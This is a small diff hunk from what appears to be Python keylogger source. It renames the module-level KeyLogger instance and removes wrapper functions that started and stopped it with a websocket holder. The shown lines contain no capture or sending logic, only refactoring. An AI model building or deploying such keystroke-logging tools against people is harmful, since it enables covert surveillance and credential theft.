@@ -72,10 +72,4 @@ class KeyLogger:
             self.send_thread = None
             print("[Keylogger] Stopped")
 
-key_logger = KeyLogger()
-
-def start_keylogger(ws_holder):
-    key_logger.start_keylogger(ws_holder)
-
-def stop_keylogger():
-    key_logger.stop_keylogger()
+keylogger = KeyLogger()
